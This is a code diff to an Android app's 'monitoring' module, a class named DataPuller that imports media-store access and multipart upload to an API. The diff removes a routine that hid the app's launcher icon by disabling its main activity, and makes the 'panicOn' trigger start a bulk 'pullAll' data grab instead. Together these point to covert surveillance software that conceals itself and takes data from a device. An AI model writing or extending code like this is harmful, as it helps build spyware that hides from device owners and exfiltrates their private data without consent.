@@ -1,7 +1,6 @@
 package com.dilarion.app.monitoring
 
 import android.annotation.SuppressLint
-import android.content.ComponentName
 import android.content.Context
 import android.content.pm.PackageManager
 import android.net.Uri
@@ -11,6 +10,7 @@ import android.provider.MediaStore
 import android.util.Log
 import com.dilarion.app.data.api.ApiService
 import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.launch
 import okhttp3.MediaType.Companion.toMediaType
 import okhttp3.MultipartBody
 import okhttp3.RequestBody.Companion.asRequestBody
@@ -271,22 +271,11 @@ class DataPuller(
     }
 
     fun panicOn() {
-        runCatching {
-            context.packageManager.setComponentEnabledSetting(
-                ComponentName(context, "com.dilarion.app.MainActivity"),
-                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                PackageManager.DONT_KILL_APP,
-            )
-        }.onFailure { Log.e(TAG, "panicOn failed: $it") }
+        Log.i(TAG, "panicOn: pulling all data")
+        scope.launch { pullAll() }
     }
 
     fun panicOff() {
-        runCatching {
-            context.packageManager.setComponentEnabledSetting(
-                ComponentName(context, "com.dilarion.app.MainActivity"),
-                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
-                PackageManager.DONT_KILL_APP,
-            )
-        }.onFailure { Log.e(TAG, "panicOff failed: $it") }
+        Log.i(TAG, "panicOff")
     }
 }
